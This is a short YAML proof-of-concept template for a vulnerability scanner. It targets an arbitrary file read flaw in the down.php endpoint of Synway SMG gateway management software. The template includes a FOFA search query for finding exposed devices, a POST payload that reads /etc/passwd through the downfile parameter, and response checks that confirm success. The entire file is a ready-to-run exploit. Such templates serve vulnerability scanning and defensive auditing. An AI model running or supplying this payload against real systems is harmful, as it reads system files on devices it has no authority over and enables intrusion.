id: poc-yaml-synway-smg-downphp-anyfile-read
info:
  name: 三汇SMG 网关管理软件 down.php 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 三汇SMG 网关管理软件
  fofa: body="text ml10 mr20" && title="网关管理软件"
requests:
- method: POST
  path: /down.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: downfile=/etc/passwd&down=x&runinfoupdate=1
  expression: 'status_code == 200 &&

    contains(body,"root:") &&

    contains(body,"/bin/sh") &&

    contains(headers,"application/octet-stream")

    '
variables: {}
transport: http
